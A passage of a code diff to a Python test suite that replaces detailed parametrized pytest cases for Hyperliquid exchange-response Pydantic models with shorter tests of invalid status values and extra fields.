-    assert "not permitted" in str(exc_info.value).lower()
+def test_HyperliquidRawExchangeResponse_invalid_status() -> None:
+    """Test hl response invalid status."""
+    with pytest.raises(ValidationError):
+        HyperliquidRawExchangeResponse.model_validate({"status": "error", "data": None})
 
 
-# Filled Model Failures
-@pytest.mark.parametrize(
-    ("invalid_data", "expected_keywords"),
-    [
-        ({"oid": 1, "totalSz": "1.5", "avgPx": "inf"}, ("finite decimal", "inf")),
-        ({"oid": 1, "totalSz": "NaN", "avgPx": "1.0"}, ("finite decimal", "nan")),
-        ({"oid": 1, "totalSz": "", "avgPx": "1.0"}, ("string", "cannot be empty")),
-        ({"oid": 1, "totalSz": "1.0", "avgPx": ""}, ("string", "cannot be empty")),
-        ({"oid": 1, "totalSz": "1.0", "avgPx": "1..0"}, ("cannot convert", "1..0")),
-        ({"oid": 1, "totalSz": 1.0, "avgPx": "1.0"}, ("expected string", "got float")),
-        ({"oid": -1, "totalSz": "1", "avgPx": "1"}, ("value cannot be negative",)),
-        ({"oid": 1, "totalSz": "1"}, ("field required", "avgPx")),
-        ({"oid": 1, "avgPx": "1"}, ("field required", "totalSz")),
-        ({"totalSz": "1", "avgPx": "1"}, ("field required", "oid")),
-    ],
-)
-def test_hl_filled_invalid(
-    invalid_data: dict[str, Any],
-    expected_keywords: tuple[str, ...],
-) -> None:
-    """Test hl filled invalid."""
-    with pytest.raises((ValidationError, TypeError, EmptyStringError)) as exc_info:
-        HyperliquidRawExchangeStatusFilled.model_validate(invalid_data)
-    error_str = str(exc_info.value).lower()
-    for keyword in expected_keywords:
-        # Some keywords may not match due to different error types
-        if keyword.lower() not in error_str:
-            # Allow alternative error messages for business logic errors
-            if "expected string" in keyword.lower():
-                valid_alts = [
-                    "input should be a valid string",
-                    "must be a string",
-                    "expected string",
-                    "must be str",
-                ]
-                assert any(alt in error_str for alt in valid_alts)
-            elif "got int" in keyword.lower():
-                assert any(alt in error_str for alt in ["input_type=int", "got int"])
-            else:
-                assert keyword.lower() in error_str
-
-
-def test_hl_filled_extra_fields_ignored() -> None:
-    """Test that extra fields are rejected due to extra='forbid'."""
-    data = {"oid": 1, "totalSz": "1", "avgPx": "1", "extra": 1}
-    with pytest.raises((ValidationError, TypeError)) as exc_info:
-        HyperliquidRawExchangeStatusFilled.model_validate(data)
-    assert "extra" in str(exc_info.value).lower()
-    assert "not permitted" in str(exc_info.value).lower()
-
-
-# Status Object Failures
-@pytest.mark.parametrize(
-    ("invalid_data", "expected_keywords"),
-    [
-        ({"resting": {"oid": -1}}, ("value cannot be negative",)),
-        ({"filled": {"oid": 1, "totalSz": "", "avgPx": "1"}}, ("string", "cannot be empty")),
-        ({"error": ""}, ("string", "cannot be empty")),
-        ({"error": 123}, ("expected string", "got int")),
-    ],
-)
-def test_hl_status_object_invalid(
-    invalid_data: dict[str, Any],
-    expected_keywords: tuple[str, ...],
-) -> None:
-    """Test hl status object invalid."""
-    with pytest.raises((ValidationError, TypeError, EmptyStringError)) as exc_info:
-        HyperliquidRawExchangeStatusObject.model_validate(invalid_data)
-    error_str = str(exc_info.value).lower()
-    for keyword in expected_keywords:
-        # Some keywords may not match due to different error types
-        if keyword.lower() not in error_str:
-            # Allow alternative error messages for business logic errors
-            if "expected string" in keyword.lower():
-                valid_alts = [
-                    "input should be a valid string",
-                    "must be a string",
-                    "expected string",
-                    "must be str",
-                ]
-                assert any(alt in error_str for alt in valid_alts)
-            elif "got int" in keyword.lower():
-                assert any(alt in error_str for alt in ["input_type=int", "got int"])
-            else:
-                assert keyword.lower() in error_str
-
-
-def test_hl_status_object_extra_fields_ignored() -> None:
-    """Test that extra fields are rejected due to extra='forbid'."""
-    data = {"error": "Some error", "extra": 1}
-    with pytest.raises((ValidationError, TypeError)) as exc_info:
-        HyperliquidRawExchangeStatusObject.model_validate(data)
-    assert "extra" in str(exc_info.value).lower()
-    assert "not permitted" in str(exc_info.value).lower()
-
-
-# Response Data Failures
-@pytest.mark.parametrize(
-    ("invalid_data", "expected_exception", "expected_keywords"),
-    [
-        ({"type": "", "statuses": []}, EmptyStringError, ("string", "cannot be empty")),
-        ({"type": 123, "statuses": []}, TypeError, ("expected string", "got int")),
-        ({"type": "order", "statuses": 123}, ValidationError, ("should be a valid list",)),
-        (
-            {"type": "order", "statuses": [1, 2]},
-            ValidationError,
-            ("expected string", "got int"),
-        ),
-        (
-            {"type": "order", "statuses": ["invalid_status"]},
-            ValidationError,
-            ("invalid", "invalid_status"),
-        ),
-        (
-            {"type": "order", "statuses": [{"resting": {"oid": -1}}]},
-            ValidationError,
-            ("value cannot be negative",),
-        ),
-        ({"type": "order"}, ValidationError, ("field required", "statuses")),
-        ({"statuses": []}, ValidationError, ("field required", "type")),
-    ],
-)
-def test_hl_response_data_invalid(
-    invalid_data: dict[str, Any],
-    expected_exception: type[Exception],
-    expected_keywords: tuple[str, ...],
-) -> None:
-    """Test hl response data invalid."""
-    with pytest.raises(expected_exception) as exc_info:
-        HyperliquidRawExchangeResponseData.model_validate(invalid_data)
-    error_str = str(exc_info.value).lower()
-    for keyword in expected_keywords:
-        # Some keywords may not match due to different error types
-        if keyword.lower() not in error_str:
-            # Allow alternative error messages for business logic errors
-            if "expected string" in keyword.lower():
-                valid_alts = [
-                    "input should be a valid string",
-                    "must be a string",
-                    "expected string",
-                    "must be str",
-                ]
-                assert any(alt in error_str for alt in valid_alts)
-            elif "got int" in keyword.lower():
-                assert any(alt in error_str for alt in ["input_type=int", "got int"])
-            else:
-                assert keyword.lower() in error_str
-
-
-def test_hl_response_data_extra_fields_ignored() -> None:
-    """Test that extra fields are rejected due to extra='forbid'."""
-    data: dict[str, Any] = {"type": "order", "statuses": [], "extra": 1}
-    with pytest.raises((ValidationError, TypeError)) as exc_info:
-        HyperliquidRawExchangeResponseData.model_validate(data)
-    assert "extra" in str(exc_info.value).lower()
-    assert "not permitted" in str(exc_info.value).lower()
-
-
-# Top Level Response Failures
-@pytest.mark.parametrize(
-    ("invalid_data", "expected_exception", "expected_keywords"),
-    [
-        ({"status": "error", "data": None}, ValidationError, ("literal_error", "status")),
-        ({"status": 123, "data": None}, TypeError, ("expected string", "got int")),
-        ({}, ValidationError, ("field required", "status")),
-        (
-            {"status": "ok", "data": {"type": "order", "statuses": [1]}},
-            ValidationError,
-            ("expected string", "got int"),
-        ),
-        ({"status": "ok", "extra_field": 1}, ValidationError, ("extra", "not permitted")),
-        (
-            {"status": "ok", "data": {"type": "", "statuses": []}},
-            EmptyStringError,
-            ("string", "cannot be empty"),
-        ),
-    ],
-)
-def test_hl_response_invalid(
-    invalid_data: dict[str, Any],
-    expected_exception: type[Exception],
-    expected_keywords: tuple[str, ...],
-) -> None:
-    """Test hl response invalid."""
-    with pytest.raises(expected_exception) as exc_info:
-        HyperliquidRawExchangeResponse.model_validate(invalid_data)
-    error_str = str(exc_info.value).lower()
-    for keyword in expected_keywords:
-        # Some keywords may not match due to different error types
-        if keyword.lower() not in error_str:
-            # Allow alternative error messages for business logic errors
-            if "expected string" in keyword.lower():
-                valid_alts = [
-                    "input should be a valid string",
-                    "must be a string",
-                    "expected string",
-                    "must be str",
-                ]
-                assert any(alt in error_str for alt in valid_alts)
-            elif "got int" in keyword.lower():
-                assert any(alt in error_str for alt in ["input_type=int", "got int"])
-            else:
-                assert keyword.lower() in error_str
-
-
-# --- Specific Tests for statuses List Validation ---
-
-
-@pytest.mark.parametrize(
-    ("statuses_list", "is_valid"),
-    [
-        (["canceled", "modified", "success"], True),  # All valid strings
-        ([{"resting": {"oid": 1}}], True),  # Valid resting object
-        ([{"filled": {"oid": 2, "totalSz": "1", "avgPx": "10"}}], True),  # Valid filled object
-        ([{"error": "Failed"}], True),  # Valid error object
-        (["success", {"resting": {"oid": 3}}, {"error": "Timeout"}], True),  # Mixed valid
-        ([], True),  # Empty list is valid
-        (["canceled", "unknown"], False),  # Invalid string
-        ([{"resting": {"oid": -1}}], False),  # Invalid object content (negative oid)
-        ([{"filled": {"oid": 4}}], False),  # Invalid object content (missing fields)
-        ([123], False),  # Wrong item type (int)
-        ([None], False),  # Wrong item type (None)
-        (["canceled", 123], False),  # Mixed valid string and invalid type
-        ([{"resting": {"oid": 5}}, 123], False),  # Mixed valid object and invalid type
-        ("not_a_list", False),  # Input not a list
-    ],
-)
-def test_hl_response_data_statuses_validation(
-    statuses_list: list[dict[str, Any]] | str | int | None,  # Invalid types for Pydantic
-    is_valid: bool,
-) -> None:
-    """Test the validation logic for the 'statuses' field specifically."""
-    data_dict = {"type": "order", "statuses": statuses_list}
-    if is_valid:
-        try:
-            response_data = HyperliquidRawExchangeResponseData.model_validate(data_dict)
-            # Further checks if needed, e.g., check item types in validated_list
-            assert isinstance(response_data.statuses, list)
-            # Example check on item types
-            for item in response_data.statuses:
-                assert isinstance(item, str | HyperliquidRawExchangeStatusObject)  # Use | syntax
-        except (ValidationError, ValueError, TypeError) as e:
-            pytest.fail(f"Validation failed unexpectedly for valid input {statuses_list}: {e}")
-    else:
-        with pytest.raises((ValidationError, ValueError, TypeError)) as exc_info:
-            HyperliquidRawExchangeResponseData.model_validate(data_dict)
-        # Check that *some* error occurred. More specific message checks can be added.
-        assert exc_info is not None
-        logger.debug(
-            "hl_response_data_statuses_validation_failure",
-            input_data=str(statuses_list),
-            error=str(exc_info.value),
-            message=f"Input: {statuses_list}, Expected Failure, Got Error: {exc_info.value}",
-        )
+def test_HyperliquidRawExchangeStatusObject_extra_fields() -> None:
+    """Test that extra fields are rejected."""
+    with pytest.raises(ValidationError):
+        HyperliquidRawExchangeStatusObject.model_validate({"error": "Some error", "extra": 1})
